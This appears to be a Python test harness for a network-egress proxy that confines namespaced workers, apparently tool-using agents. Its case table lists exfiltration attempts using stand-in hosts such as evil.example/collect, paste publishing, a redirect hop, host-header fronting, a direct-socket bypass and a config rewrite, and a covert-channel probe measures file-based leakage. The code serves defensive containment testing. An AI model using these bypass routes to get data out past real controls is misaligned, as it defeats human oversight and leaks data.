"""Phase 19d lanes: the eight egress cases, the positive control and the covert-channel probe,
each run as a worker inside a fresh user+net namespace against the parent-owned proxy
(design §4.4). Linux only; ``run_all`` raises ``host_cannot_namespace`` elsewhere.

Every row carries the proxy's decision, the worker's connect outcome, the namespace routes and
the kernel counter deltas. The canary is the absence: no route, a no-route connect error, zero
counter movement; the live-reader control shows the counters do move for loopback traffic inside
the same kind of namespace.
"""

import platform
import shutil
import time
from pathlib import Path

import json

import egress19

RECEIVER_URL = "http://receiver.example/report"
ROLE_URL = "http://ops.example/admin"
CASES = (
    ("positive_control", {"url": RECEIVER_URL, "method": "GET"}, "forwarded"),
    (
        "shortener_hop",
        {"url": "http://sho.rt/abc", "method": "GET"},
        "final_destination_not_allowed",
    ),
    (
        "fronted_host",
        {"url": RECEIVER_URL, "host_header": "cdn-front.example", "method": "GET"},
        "host_header_mismatch",
    ),
    (
        "encoded_url",
        {"url": "HTTP://Evil.Example:80/%2e%2e/exfil", "method": "GET"},
        "destination_not_allowed",
    ),
    (
        "mirror",
        {"url": "http://receiver-mirror.example/report", "method": "GET"},
        "destination_not_allowed",
    ),
    (
        "in_range_out_of_role",
        {"url": ROLE_URL, "method": "GET", "role": "worker"},
        "role_not_allowed",
    ),
    (
        "unrequested_publish",
        {"url": "http://paste.example/new", "method": "POST"},
        "destination_not_allowed",
    ),
)


def wire(value):
    return json.dumps(value, sort_keys=True, separators=(",", ":"), allow_nan=False)


def host_info():
    return {
        "system": platform.system(),
        "release": platform.release(),
        "machine": platform.machine(),
    }


def run_all(base):
    if not egress19.can_namespace():
        raise RuntimeError("host_cannot_namespace")
    base = Path(base)
    base.mkdir(parents=True, exist_ok=True)
    receiver = egress19.Receiver()
    sock = base / "proxy.sock"
    proxy = egress19.Proxy(
        sock,
        allowed=[RECEIVER_URL, ROLE_URL],
        roles={egress19.canonical_url(ROLE_URL): {"operator"}},
        redirects={"http://sho.rt/abc": "http://evil.example/collect"},
        receiver_port=receiver.port,
    )
    try:
        rows = []
        for name, request, expected in CASES:
            out = egress19.run_worker(
                {"kind": "proxy", "socket": str(sock), "request": request}
            )
            rows.append(
                {
                    "case": name,
                    "request": request,
                    "decision": out["reply"]["decision"],
                    "expected": expected,
                    "final": out["reply"].get("final"),
                    "routes": out["routes"],
                    "counter_delta": out["counter_delta"],
                    "holds": out["reply"]["decision"] == expected
                    and all(v == 0 for v in out["counter_delta"].values()),
                }
            )
        # same destination, other tool: a direct socket to the receiver's real address
        direct = egress19.run_worker(
            {"kind": "direct", "host": "127.0.0.1", "port": receiver.port}
        )
        rows.append(
            {
                "case": "same_destination_other_tool",
                "request": {
                    "direct_tcp": "the receiver's loopback address and port, bypassing the proxy"
                },
                "receiver_port": receiver.port,
                "decision": "no_route" if not direct["connected"] else "connected",
                "expected": "no_route",
                "errno": direct.get("errno"),
                "routes": direct["routes"],
                "counter_delta": direct["counter_delta"],
                "holds": not direct["connected"]
                and direct.get("errno") == egress19.ENETUNREACH
                and all(v == 0 for v in direct["counter_delta"].values()),
            }
        )
        # mutable tool-server destination: the worker rewrites its own config, the proxy ignores it
        config = base / "tool-config.json"
        config.write_text('{"tool_server": "http://receiver.example/report"}')
        rewritten = egress19.run_worker(
            {
                "kind": "config_rewrite",
                "config": str(config),
                "new_destination": "http://evil.example/collect",
                "socket": str(sock),
                "request": {"url": "http://evil.example/collect", "method": "POST"},
            }
        )
        rows.append(
            {
                "case": "mutable_tool_server_destination",
                "request": {"config_rewritten_to": "http://evil.example/collect"},
                "decision": rewritten["reply"]["decision"],
                "expected": "destination_not_allowed",
                "config_after": config.read_text(),
                "routes": rewritten["routes"],
                "counter_delta": rewritten["counter_delta"],
                "holds": rewritten["reply"]["decision"] == "destination_not_allowed"
                and all(v == 0 for v in rewritten["counter_delta"].values()),
            }
        )
        live = egress19.run_worker({"kind": "loopback_probe"})
        covert = covert_probe(base)
        return {
            "host": host_info(),
            "namespace": {
                "mode": "unshare --user --map-root-user --net",
                "routes_in_fresh_namespace": rows[0]["routes"],
            },
            "rows": rows,
            "all_hold": all(r["holds"] for r in rows),
            "receiver_effects": len(receiver.effects),
            "proxy_log": proxy.log,
            "live_reader_control": {
                "connected": live["connected"],
                "counter_delta": live["counter_delta"],
                "routes_after_lo_up": live.get("routes_after_lo_up"),
                "proves": "the counter reader moves for loopback traffic inside the same kind of namespace",
            },
            "covert_probe": covert,
            "second_operator_canary": "attested, not recomputable (IOU-19-CANARY)",
        }
    finally:
        proxy.close()
        receiver.close()
        shutil.rmtree(base, ignore_errors=True)


def covert_probe(base, writes=64, size=4096):
    """One measured shared-storage channel: a worker in a namespace writes a file the parent can
    read. Reports the observed bits per second of that channel and states non-elimination."""
    path = Path(base) / "covert.bin"
    start = time.perf_counter()
    code, out, err = egress19.in_namespace(
        ["python", "-c", f"open({str(path)!r},'wb').write(b'x'*{writes * size})"]
    )
    elapsed = time.perf_counter() - start
    delivered = path.stat().st_size if path.exists() else 0
    return {
        "channel": "shared filesystem (parent-readable file written from the namespace)",
        "bytes_delivered": delivered,
        "seconds": round(elapsed, 4),
        "bits_per_second_observed": round(delivered * 8 / elapsed) if elapsed else None,
        "eliminated": False,
        "note": "the namespace confines the network, not the filesystem; a mounted work directory is a channel by design and is reported, not closed",
    }
